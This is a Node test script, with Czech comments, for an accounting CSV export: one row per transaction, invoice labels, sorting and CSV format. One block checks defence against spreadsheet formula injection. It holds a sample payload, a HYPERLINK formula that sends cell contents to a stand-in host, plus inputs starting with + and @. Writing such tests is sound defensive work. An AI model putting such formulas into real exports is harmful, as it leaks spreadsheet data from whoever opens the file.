#!/usr/bin/env node
/**
 * Účetní export — lib/ucetni-export.ts.
 *
 * Pusť `node --experimental-strip-types scripts/ucetni-export.test.mjs`.
 *
 * Nejdůležitější tu není formátování CSV, ale to, že split platba
 * (víc faktur na jednu transakci) nezdvojí částku — řádek exportu je
 * jeden na TRANSAKCI, ne jeden na PÁROVÁNÍ.
 */

const { popisFaktury, sestavitRadkyExportu, vygenerovatCsvExportu } = await import('../lib/ucetni-export.ts')
const { csvBunka } = await import('../lib/csv-bunka.ts')
const { readFileSync } = await import('node:fs')

let chyb = 0
const ok = (popis, podminka) => {
  if (!podminka) chyb++
  console.log(`  ${podminka ? 'OK   ' : 'CHYBA'} ${popis}`)
}

console.log('\n== Jeden řádek na transakci, i při split platbě na dvě faktury ==')

const transakce1 = [{
  id: 't1', datum: '2026-03-10', smer: 'vydaj', castkaHaleru: 100000,
  protistrana: 'ABC s.r.o.', vs: '20260001', kategorie: 'suroviny', zdroj: 'rucni', branchId: 'b1',
}]
const platby1 = [
  { transakceId: 't1', fakturaId: 'FA-001', stav: 'potvrzeno' },
  { transakceId: 't1', fakturaId: 'FA-002', stav: 'potvrzeno' },
]
const radky1 = sestavitRadkyExportu(transakce1, platby1, { b1: 'Černá Perla' })

ok('jeden řádek, ne dva', radky1.length === 1)
ok('částka se nezdvojila', radky1[0].castkaHaleru === 100000)
ok('obě faktury se spojily do jedné buňky', radky1[0].faktury === 'FA-001, FA-002')
ok('středisko se dohledalo podle branchId', radky1[0].stredisko === 'Černá Perla')
ok('doklad je VS, když existuje', radky1[0].doklad === '20260001')

console.log('\n== Nepotvrzené párování se do Faktury nepromítne ==')

const radky2 = sestavitRadkyExportu(transakce1, [
  { transakceId: 't1', fakturaId: 'FA-NAVRZENO', stav: 'navrzeno' },
  { transakceId: 't1', fakturaId: 'FA-ZAMITNUTO', stav: 'zamitnuto' },
], {})
ok('návrh bez potvrzení se neobjeví', radky2[0].faktury === '')

console.log('\n== Číslo faktury a dodavatel místo id (Faktury v hlavní databázi) ==')
const radkyPopis = sestavitRadkyExportu(
  [{ id: 't1', datum: '2026-10-01', smer: 'vydaj', castkaHaleru: 1000, protistrana: 'X', vs: '1', kategorie: null, zdroj: 'csv_banka', branchId: null }],
  [{ transakceId: 't1', fakturaId: 'f1', stav: 'potvrzeno' }, { transakceId: 't1', fakturaId: 'f-zmizela', stav: 'potvrzeno' }],
  {},
  { f1: popisFaktury('FV2026/0815', 'Dodavatel s.r.o.') },
)
ok('popis „číslo (dodavatel)", neznámá faktura zůstane jako id', radkyPopis[0].faktury === 'FV2026/0815 (Dodavatel s.r.o.), f-zmizela')
ok('bez čísla jen dodavatel, bez obojího věta', popisFaktury(null, 'D') === 'D' && popisFaktury('', '') === 'faktura bez čísla')
const radkyDve = sestavitRadkyExportu(
  [{ id: 't1', datum: '2026-10-01', smer: 'vydaj', castkaHaleru: 1000, protistrana: 'X', vs: '1', kategorie: null, zdroj: 'csv_banka', branchId: null }],
  [{ transakceId: 't1', fakturaId: 'f1', stav: 'potvrzeno' }, { transakceId: 't1', fakturaId: 'f2', stav: 'potvrzeno' },
   { transakceId: 't1', fakturaId: 'f1', stav: 'potvrzeno' }],
  {},
  { f1: popisFaktury(null, 'Makro'), f2: popisFaktury(null, 'Makro') },
)
ok('dvě faktury se stejným popisem jsou v exportu dvakrát, táž faktura jednou', radkyDve[0].faktury === 'Makro, Makro')

console.log('\n== Vzorec z e-mailu se v Excelu nespustí ==')
{
  // Buňka po odstranění uvozovek CSV — to, co Excel uvidí.
  const bunka = (radek, index) => {
    const m = radek.match(/("([^"]|"")*"|[^;]*)(;|$)/g).map((x) => x.replace(/;$/, ''))
    const b = m[index] ?? ''
    return b.startsWith('"') ? b.slice(1, -1).replace(/""/g, '"') : b
  }
  const zakladni = { id: 't1', datum: '2026-10-10', smer: 'vydaj', castkaHaleru: 1210000, protistrana: 'Dodavatel s.r.o.', vs: '2026101', kategorie: null, zdroj: 'csv_banka', branchId: null }
  const radky = sestavitRadkyExportu(
    [zakladni, { ...zakladni, id: 't2', protistrana: '+420 Útočník' }],
    [{ transakceId: 't1', fakturaId: 'f1', stav: 'potvrzeno' }],
    {},
    { f1: popisFaktury('=HYPERLINK("https://x.example/?"&A2&H2)', '') },
  )
  const csv = vygenerovatCsvExportu(radky).split('\r\n')
  const sloupecFaktur = csv[0].split(';').findIndex((h) => /Faktur/.test(h))
  const sloupecProtistrany = csv[0].split(';').findIndex((h) => /Protistrana/.test(h))
  ok('hlavička: sloupce Faktura(y) a Protistrana nalezené', sloupecFaktur >= 0 && sloupecProtistrany >= 0)
  ok('číslo faktury začínající = je v Excelu text (apostrof)', bunka(csv[1], sloupecFaktur).startsWith("'="))
  ok('protistrana začínající + je text', bunka(csv[2], sloupecProtistrany).startsWith("'+"))
  ok('@ i tabulátor taky', csvBunka('@SUM(1+1)').startsWith("'@") && csvBunka('\tx').startsWith("'"))
  // Čísla zůstávají čísly, jinak by účetnímu přestaly fungovat součty.
  ok('záporná částka (dobropis) zůstane číslem: -5.00', csvBunka('-5.00') === '-5.00' && csvBunka(-5) === '-5')
  ok('obyčejný text beze změny', csvBunka('Makro') === 'Makro')
  // Export faktur musí používat TUTÉŽ funkci — vlastní kopie by ochranu neměla.
  const exportFaktur = readFileSync('app/api/faktury/export/route.ts', 'utf8')
  ok('export faktur bere sdílenou csvBunka (bez vlastní kopie)',
    /import \{ csvBunka \} from '@\/lib\/csv-bunka'/.test(exportFaktur) && !/function csvBunka/.test(exportFaktur))
}

console.log('\n== branchId null → středisko "Firma" ==')

const radky3 = sestavitRadkyExportu([{ ...transakce1[0], branchId: null }], [], {})
ok('firemní transakce má středisko Firma', radky3[0].stredisko === 'Firma')

console.log('\n== Chybějící VS → doklad je TRX-<id> ==')

const radky4 = sestavitRadkyExportu([{ ...transakce1[0], vs: '' }], [], {})
ok('doklad je odvozený z id, ne prázdný', radky4[0].doklad === 'TRX-T1')

console.log('\n== Chybějící kategorie se exportuje jako prázdný řetězec, ne null ==')

const radky5 = sestavitRadkyExportu([{ ...transakce1[0], kategorie: null }], [], {})
ok('kategorie je prázdný string', radky5[0].kategorie === '')

console.log('\n== Řazení podle data =========================================')

const radky6 = sestavitRadkyExportu([
  { ...transakce1[0], id: 't2', datum: '2026-03-05', vs: 'B' },
  { ...transakce1[0], id: 't3', datum: '2026-03-20', vs: 'C' },
  { ...transakce1[0], id: 't1', datum: '2026-03-10', vs: 'A' },
], [], {})
ok('řádky jsou chronologicky', radky6.map((r) => r.datum).join(',') === '2026-03-05,2026-03-10,2026-03-20')

console.log('\n== CSV: BOM, středník, CRLF, hlavička ==========================')

const csv = vygenerovatCsvExportu(radky1)
ok('BOM na začátku', csv.charCodeAt(0) === 0xfeff)
ok('hlavička obsahuje Doklad', csv.includes('Doklad;Datum;Středisko'))
ok('řádky oddělené CRLF', csv.includes('\r\n'))
ok('částka v Kč, ne v haléřích', csv.includes('1000.00'))

console.log('\n== CSV: buňka s středníkem se uzavře do uvozovek ================')

const csvSeStrednikem = vygenerovatCsvExportu(sestavitRadkyExportu(
  [{ ...transakce1[0], protistrana: 'Firma; s.r.o.' }], [], {},
))
ok('středník v hodnotě je v uvozovkách', csvSeStrednikem.includes('"Firma; s.r.o."'))

console.log(`\n${chyb === 0 ? 'VŠECHNY KONTROLY PROŠLY' : `SELHALO: ${chyb} kontrol`}`)
if (chyb > 0) process.exit(1)
